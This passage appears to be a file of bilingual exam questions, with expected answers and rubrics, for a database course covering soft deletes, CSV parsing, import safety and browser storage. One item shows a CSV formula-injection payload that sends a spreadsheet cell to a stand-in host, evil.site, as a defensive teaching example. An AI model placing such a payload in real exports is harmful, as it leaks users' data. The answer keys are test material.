    topic: 'Archiving vs. Hard Deleting Used Records',
    learning_objective: 'Analyze what breaks in historical reports when referenced master records are hard-deleted',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: false,
        prompt_en: 'Look at the `Products` and `OrderLines` tables below. CampusMart stops selling `P02` (Winter Scarf) in April. If the manager runs `DELETE FROM Products WHERE product_id = "P02"`, what happens to historical January sales reports that join `OrderLines` with `Products`?',
        prompt_vi: 'Quan sát hai bảng `Products` và `OrderLines` dưới đây. CampusMart ngừng kinh doanh mã `P02` (Khăn len mùa đông) vào tháng 4. Nếu quản lý chạy lệnh `DELETE FROM Products WHERE product_id = "P02"`, điều gì sẽ xảy ra với báo cáo doanh thu lịch sử tháng 1 khi kết nối (`INNER JOIN`) bảng `OrderLines` với `Products`?',
        context: 'Master data lifecycle at CampusMart.',
        optional_table_or_diagram: `Products:                               OrderLines (January Sales):
+------------+---------------+Active+   +---------+------------+-----+------------+
| product_id | product_name  |      |   | line_id | product_id | qty | unit_price |
+------------+---------------+------+   +---------+------------+-----+------------+
| P01        | Canvas Tote   |  1   |   |   101   | P01        |  2  |   60,000   |
| P02        | Winter Scarf  |  1   |   |   102   | P02        |  3  |  100,000   |
+------------+---------------+------+   +---------+------------+-----+------------+`,
        expected_key_points: [
          'If `P02` is hard-deleted from `Products` (and foreign keys are not blocking it), an `INNER JOIN` between `OrderLines` and `Products` drops `line_id = 102`, making `300,000 VND` of historical January revenue vanish!',
          'Even with a `LEFT JOIN`, the product name and category for `P02` become `NULL`.',
          'Correct approach: Archive / soft-delete by setting `is_active = 0` (or `status = "ARCHIVED"`) so `P02` cannot be added to new orders while historical sales remain intact.',
        ],
        acceptable_alternatives: ['Mentioning `FOREIGN KEY ... ON DELETE RESTRICT` blocking the deletion + `is_active` flag.'],
        common_misconceptions: ['Thinking discontinued products should be deleted from the database table.'],
        optional_follow_up: 'In our Oral Exam Studio app, why must a question that has already been used in an exam be archived rather than deleted?',
        rubric_specifics: {
          accuracy_full: 'Calculates that 300,000 VND (`line_id = 102`) disappears under `INNER JOIN` if `P02` is deleted.',
          reasoning_full: 'Explains broken referential links to historical transactions.',
          application_full: 'Recommends soft-archiving (`is_active = 0` / `ARCHIVED`) plus foreign key protection.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'In the `Products` table above, suppose `P02` is properly marked `Active = 0` instead of deleted. What bug occurs if an AI assistant writes `SELECT * FROM OrderLines JOIN Products USING(product_id) WHERE Products.Active = 1` to calculate total Q1 store revenue?',
        prompt_vi: 'Trong bảng `Products` ở trên, giả sử `P02` đã được đánh dấu `Active = 0` thay vì xóa vật lý. Lỗi gì sẽ xảy ra nếu trợ lý AI viết câu lệnh `SELECT * FROM OrderLines JOIN Products USING(product_id) WHERE Products.Active = 1` để tính tổng doanh thu quý 1 của cửa hàng?',
        context: 'Filtering active status on historical fact queries.',
        expected_key_points: [
          'Filtering `WHERE Products.Active = 1` in a historical revenue query excludes all past sales of items that were active in January (`P02`, 300,000 VND) but discontinued later!',
          '`Active = 1` should only filter the POS catalog screen when creating *new* orders, NOT when summing historical `OrderLines`.',
          'Total Q1 revenue must include all valid completed orders regardless of whether the product is still sold today.',
        ],
        acceptable_alternatives: ['Distinguishing current catalog availability from historical financial accounting.'],
        common_misconceptions: ['Always adding `WHERE product.active = 1` to every query in the company by habit.'],
        optional_follow_up: 'Where SHOULD `WHERE Products.Active = 1` be used?',
        rubric_specifics: {
          accuracy_full: 'Identifies that 300,000 VND of legitimate Q1 sales is wrongly excluded.',
          reasoning_full: 'Distinguishes current catalog state from historical transaction truth.',
          application_full: 'States that `Active = 1` belongs on new-order product pickers, not historical financial totals.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_B13_CSV_IMPORT_CORRUPTION',
    lecture_ids: ['01'],
    question_group: 'B_APPLIED',
    topic: 'Diagnosing Unquoted Comma Splits in CSV Imports',
    learning_objective: 'Explain how naive string splitting on commas corrupts CSV imports',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: false,
        prompt_en: 'A junior developer writes a CSV parser using `line.split(",")`. Inspect the raw CSV line and resulting table columns below. Explain why `class_name` received `" K68"` and `notes` got shifted, and how RFC-4180 CSV parsing solves this.',
        prompt_vi: 'Một lập trình viên mới viết hàm đọc CSV bằng lệnh `line.split(",")`. Hãy quan sát dòng CSV gốc và kết quả tách cột dưới đây. Giải thích vì sao cột `class_name` lại nhận giá trị `" K68"` và dữ liệu bị lệch cột, cùng cách bộ phân tích CSV chuẩn RFC-4180 xử lý trường hợp này.',
        context: 'Student list & Blooket CSV import engineering.',
        optional_table_or_diagram: `Raw CSV Line:
00231088,"Nguyen Van An, Jr.","HSB3102E, K68",Active

Naive line.split(",") Result:
Col 1 (student_id) : 00231088
Col 2 (full_name)  : "Nguyen Van An
Col 3 (class_name) :  Jr."
Col 4 (status)     : "HSB3102E
Col 5 (extra!)     :  K68"`,
        expected_key_points: [
          '`line.split(",")` splits on EVERY comma, ignoring whether the comma is inside double quotes `"..."`.',
          'Because `"Nguyen Van An, Jr."` and `"HSB3102E, K68"` contain embedded commas inside quotes, every subsequent column shifts to the right.',
          'A state-machine CSV parser tracks `inQuotes = true/false` and treats commas inside double quotes as literal text.',
        ],
        acceptable_alternatives: ['Also explaining escaped double quotes `""` inside quoted CSV fields.'],
        common_misconceptions: ['Telling users they are never allowed to use commas in question prompts or names when exporting CSVs.'],
        optional_follow_up: 'In our Oral Exam Studio, why do SQL snippets and English prompts in CSV exports almost always require quoted CSV parsing?',
        rubric_specifics: {
          accuracy_full: 'Traces how the comma inside `"Nguyen Van An, Jr."` shifts all columns right.',
          reasoning_full: 'Explains why naive `.split(",")` ignores quote boundaries.',
          application_full: 'Describes quote-aware state machine parsing (RFC-4180).',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'Look at the exported CSV cell below generated from a student feedback form. Why is `=HYPERLINK("http://evil.site", "Click")` dangerous when a teacher opens the CSV in Excel, and how should the export function sanitize it?',
        prompt_vi: 'Quan sát ô dữ liệu CSV dưới đây được xuất ra từ biểu mẫu phản hồi của sinh viên. Tại sao chuỗi `=HYPERLINK("http://evil.site", "Click")` lại nguy hiểm khi giảng viên mở file CSV bằng Excel, và hàm xuất CSV cần làm sạch (sanitize) ô này như thế nào?',
        context: 'CSV Formula Injection defense in Gradebook exports.',
        optional_table_or_diagram: `Student_ID | Student_Name | Comment
-----------+--------------+----------------------------------------------
00231099   | Le Minh      | =HYPERLINK("http://evil.site?leak="&A2,"OK")`,
        expected_key_points: [
          'This is CSV / Formula Injection: spreadsheet programs (Excel, Google Sheets) execute cells starting with `=`, `+`, `-`, or `@` as live formulas.',
          'The malicious formula can exfiltrate other cells (`&A2`) or trigger external links when clicked.',
          'Defense: Prefix any text cell starting with `=`, `+`, `-`, `@`, `\t`, or `\r` with a single quote `\'` (e.g., `"\'=HYPERLINK(...)"`) before writing to CSV.',
        ],
        acceptable_alternatives: ['Treating all imported/exported user notes as untrusted plain text.'],
        common_misconceptions: ['Thinking CSV files can only contain passive text and cannot trigger formulas in spreadsheet software.'],
        optional_follow_up: 'Should a negative score adjustment like `-0.5` be prefixed with a quote, or only non-numeric strings starting with `-`?',
        rubric_specifics: {
          accuracy_full: 'Identifies CSV / Excel Formula Injection via leading `=`.',
          reasoning_full: 'Explains how spreadsheet software auto-evaluates leading `=`, `+`, `-`, `@`.',
          application_full: 'Specifies prefixing dangerous leading characters with `\'` during CSV export.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_B14_DUPLICATE_IMPORT_STRATEGY',
    lecture_ids: ['01'],
    question_group: 'B_APPLIED',
    topic: 'Handling ID Collisions During Data Import',
    learning_objective: 'Evaluate safe vs unsafe conflict resolution when importing records with existing IDs',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: false,
        prompt_en: 'An instructor imports a JSON file of 10 questions into the Question Bank. Two of the imported questions have IDs (`Q_01_01`, `Q_01_02`) that already exist in the bank and were used in yesterday’s exam. Why must the app NOT silently run `INSERT OR REPLACE` without warning?',
        prompt_vi: 'Giảng viên nhập một file JSON gồm 10 câu hỏi vào Ngân hàng câu hỏi. Hai câu trong file có mã (`Q_01_01`, `Q_01_02`) trùng với mã đã có sẵn trong ngân hàng và đã được dùng trong buổi thi hôm qua. Tại sao ứng dụng KHÔNG ĐƯỢC âm thầm chạy lệnh ghi đè (`INSERT OR REPLACE`) mà không cảnh báo?',
        context: 'Question bank import safety in HSB3102E Studio.',
        optional_table_or_diagram: `Existing Bank:
Q_01_01 (Version 1, Used in Attempt ATT_09, Topic: OLTP vs OLAP)

Incoming Import File:
Q_01_01 (Completely different question: Topic: Normalization 3NF)`,
        expected_key_points: [
          'Silently overwriting `Q_01_01` replaces the original question definition with a completely different topic without the instructor’s knowledge.',
          'Even if attempts store snapshots, silent ID collisions corrupt bank statistics, lecture mappings, and version tracking.',
          'The importer must detect duplicate IDs during preview, report the exact colliding rows, and require explicit instructor confirmation (skip, create new version, or cancel).',
        ],
        acceptable_alternatives: ['Explaining how `INSERT OR REPLACE` in SQLite deletes and recreates the row, potentially triggering cascade side effects.'],
        common_misconceptions: ['Using `INSERT OR REPLACE` by default for all user file imports.'],
        optional_follow_up: 'Why is a preview screen before committing an import essential for instructor trust?',
        rubric_specifics: {
          accuracy_full: 'Explains how silent overwrite destroys existing question definitions.',
          reasoning_full: 'Identifies ID collision risks on bank auditability and history.',
          application_full: 'Describes pre-import preview with conflict detection and explicit user choice.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'Look at the Student CSV import preview below. Row 3 has a syntax/missing-name error, while Rows 1 and 2 are valid. Compare two import designs: (Design 1) Crash midway after inserting Row 1, leaving partial data; (Design 2) Validate all rows first, report Line 3’s error clearly, and allow importing valid rows in a single transaction. Why is Design 2 superior?',
        prompt_vi: 'Quan sát bảng preview nhập CSV sinh viên dưới đây. Dòng 3 bị lỗi thiếu họ tên, trong khi Dòng 1 và 2 hợp lệ. Hãy so sánh hai thiết kế: (Thiết kế 1) Chạy tuần tự rồi văng lỗi ở Dòng 3 khiến dữ liệu vào dở dang; (Thiết kế 2) Kiểm tra toàn bộ các dòng trước, báo rõ lỗi ở Dòng 3 và cho phép lưu các dòng hợp lệ trong một transaction. Tại sao Thiết kế 2 tốt hơn?',
        context: 'Safe CSV import design.',
        optional_table_or_diagram: `Line | student_id | full_name       | class_name | Validation Status
-----+------------+-----------------+------------+----------------------------
  1  | 00231010   | Pham Thu Ha     | HSB3102E   | VALID
  2  | 00231011   | Hoang Minh Duc  | HSB3102E   | VALID
  3  | 00231012   |                 | HSB3102E   | ERROR: Missing full_name`,
        expected_key_points: [
          'Design 1 leaves the database in an unpredictable half-imported state; when the user fixes Line 3 and re-uploads the file, Rows 1 and 2 now fail as duplicates!',
          'Design 2 validates before mutating state, reports exact line numbers (`Line 3: Missing full_name`), and commits atomically.',
          'Never corrupt or overwrite existing records when an uploaded file contains faulty lines.',
        ],
        acceptable_alternatives: ['Explaining atomic rollback on error vs preview-and-confirm workflow.'],
        common_misconceptions: ['Inserting rows one by one without transaction boundaries during file uploads.'],
        optional_follow_up: 'What happens in Design 1 when the instructor fixes Line 3 and uploads the exact same 3-row file a second time?',
        rubric_specifics: {
          accuracy_full: 'Explains the partial-import duplicate trap on re-upload in Design 1.',
          reasoning_full: 'Highlights pre-validation + line-level error reporting + transactional commit.',
          application_full: 'Shows how instructors can fix Line 3 cleanly without corrupting existing roster data.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_B15_OFFLINE_LOCAL_STORAGE_TRADEOFF',
    lecture_ids: ['01'],
    question_group: 'B_APPLIED',
    topic: 'Local-First Storage (IndexedDB + SQLite) & Backup Discipline',
    learning_objective: 'Analyze browser origin isolation and why local databases require independent backups',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: false,
        prompt_en: 'An instructor grades 30 students on `http://localhost:3000` in Chrome (stored in IndexedDB), then opens `http://127.0.0.1:5173` in Edge and sees none of the 30 grades. Based on how browser storage works, explain why the data did not appear and how the instructor should move data safely.',
        prompt_vi: 'Giảng viên chấm điểm 30 sinh viên trên địa chỉ `http://localhost:3000` bằng trình duyệt Chrome (lưu trong IndexedDB), sau đó mở `http://127.0.0.1:5173` bằng trình duyệt Edge và không thấy điểm của 30 sinh viên đó. Dựa trên cơ chế lưu trữ cục bộ của trình duyệt, hãy giải thích tại sao và nêu cách chuyển dữ liệu an toàn.',
        context: 'Local-first database architecture in web applications.',
        optional_table_or_diagram: `Session A: Chrome | Origin: http://localhost:3000  -> IndexedDB_A (30 graded attempts)
Session B: Edge   | Origin: http://127.0.0.1:5173  -> IndexedDB_B (0 graded attempts)`,
        expected_key_points: [
          'IndexedDB is strictly isolated by browser profile AND by Same-Origin Policy (`protocol + hostname + port`).',
          '`localhost:3000` in Chrome and `127.0.0.1:5173` in Edge have completely separate local storage sandboxes.',
          'Furthermore, IndexedDB inside a browser is NOT an independent backup (clearing browser site data erases it).',
          'Solution: Export a full JSON backup file (or sync with the local project SQLite database file) and restore/import it when switching browsers or ports.',
        ],
        acceptable_alternatives: ['Explaining how syncing to the local SQLite file `/data/hsb3102e_exam_studio.sqlite` bridges browser sessions on the same machine.'],
        common_misconceptions: ['Assuming IndexedDB automatically syncs across Chrome, Edge, and different localhost ports.'],
        optional_follow_up: 'Why should an instructor still export a JSON backup file at the end of every exam session even when using local storage?',
        rubric_specifics: {
          accuracy_full: 'Identifies Same-Origin (`scheme + host + port`) and browser profile isolation.',
          reasoning_full: 'Explains why IndexedDB is not a standalone external backup.',
          application_full: 'Recommends exporting/importing the versioned JSON backup or syncing with the local SQLite file.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'Compare two ways of opening a local web app on exam day: (Method 1) Double-clicking `index.html` via `file:///C:/exam/index.html`, versus (Method 2) Serving the app over local HTTP (`http://localhost:3000`) with SQLite + IndexedDB. Why is `file://` unreliable for persistent database storage?',
        prompt_vi: 'Hãy so sánh hai cách mở ứng dụng thi trên máy cá nhân: (Cách 1) Nhấp đúp trực tiếp vào file `index.html` qua giao thức `file:///C:/exam/index.html`, và (Cách 2) Chạy qua máy chủ cục bộ `http://localhost:3000` kết hợp SQLite + IndexedDB. Tại sao giao thức `file://` lại không đáng tin cậy để lưu trữ dữ liệu thi?',
        context: 'Deployment and runtime reliability for local exam tools.',
        expected_key_points: [
          'Modern browsers treat `file://` origins as opaque/restricted: ES modules (`type="module"`), CORS fetches, Service Workers, and persistent IndexedDB origins behave inconsistently or are blocked.',
          'Moving the folder to another directory changes the `file://` path and can orphan browser storage.',
          'Serving over `http://localhost:3000` provides a stable origin for IndexedDB and allows direct persistence to the project’s local SQLite file.',
        ],
        acceptable_alternatives: ['Mentioning browser security restrictions on `file://` for JS modules and storage APIs.'],
        common_misconceptions: ['Thinking double-clicking an HTML file gives full access to stable database APIs across all browsers.'],
        optional_follow_up: 'Once `http://localhost:3000` is running locally, does it need an active internet connection to draw questions and save grades?',
        rubric_specifics: {
          accuracy_full: 'Explains opaque origin restrictions and module/storage limitations of `file://`.',
          reasoning_full: 'Contrasts path-dependent `file://` behavior with stable `http://localhost:3000` origin.',
          application_full: 'Confirms that `localhost` runs 100% offline on the instructor’s machine without internet.',
        },
      },
    ],
  },
];
